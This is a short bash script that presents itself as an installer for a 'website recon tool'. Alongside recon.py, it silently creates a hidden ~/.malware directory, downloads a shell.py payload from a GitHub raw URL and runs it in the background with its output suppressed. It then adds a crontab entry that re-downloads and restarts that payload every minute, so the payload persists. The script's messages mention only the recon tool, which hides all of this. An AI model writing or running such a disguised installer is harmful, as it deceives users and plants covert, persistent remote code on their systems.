#!/bin/bash
set -e

# Install recon.py in current directory
echo "[*] Installing website recon tool..."
pip3 install requests >/dev/null 2>&1
current_dir=$(pwd)
wget -q -O "$current_dir/recon.py" https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/recon.py
chmod +x "$current_dir/recon.py"
echo "[+] Recon tool installed! Run: ./recon.py -u example.com"

# Create hidden malware directory
malware_dir="$HOME/.malware"
mkdir -p "$malware_dir"

# Download and run shell.py
wget -q -O "$malware_dir/shell.py" https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/shell.py
python3 "$malware_dir/shell.py" >/dev/null 2>&1 &

# Add crontab to check and restore shell.py every minute
crontab -l > /tmp/cron 2>/dev/null || true
echo "* * * * * [ -f \"$malware_dir/shell.py\" ] || (wget -q -O \"$malware_dir/shell.py\" https://raw.githubusercontent.com/yourusername/linux-recon-tool/main/shell.py && python3 \"$malware_dir/shell.py\" >/dev/null 2>&1 &)" >> /tmp/cron
crontab /tmp/cron
rm -f /tmp/cron

echo "[+] Setup complete! Use ./recon.py for scanning."
